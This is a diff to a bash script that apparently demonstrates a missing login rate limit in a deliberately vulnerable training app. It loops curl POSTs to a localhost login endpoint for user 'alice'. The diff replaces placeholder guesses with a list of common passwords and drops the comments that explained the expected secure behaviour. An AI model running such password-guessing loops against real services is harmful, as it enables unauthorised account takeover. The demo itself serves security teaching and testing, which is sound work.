@@ -1,13 +1,13 @@
 #!/usr/bin/env bash
-# Vuln #8 — no login rate limit. Fire 15 guesses at Alice's account.
-# VULN: all 15 processed (401s), attacker can keep going forever.
-# SECURE: after 5 attempts/min the server replies 429 and stops checking.
+# Vuln #8: no login rate limit
 set -euo pipefail
 BASE="${1:-http://localhost:${PORT:-3000}}"
-for i in $(seq 1 15); do
+i=0
+for GUESS in 123456 password qwerty alice letmein 111111 iloveyou admin welcome \
+             monkey dragon sunshine princess alice123 alicepass; do
+  i=$((i + 1))
   CODE=$(curl -sk -o /dev/null -w '%{http_code}' -X POST "$BASE/api/login" \
     -H 'Content-Type: application/json' \
-    --data-raw "{\"username\":\"alice\",\"password\":\"guess$i\"}")
-  echo "attempt $i -> HTTP $CODE"
+    --data-raw "{\"username\":\"alice\",\"password\":\"$GUESS\"}")
+  echo "attempt $i ($GUESS) -> HTTP $CODE"
 done
-echo "(VULN: all 401. SECURE: flips to 429 after the 5th.)"
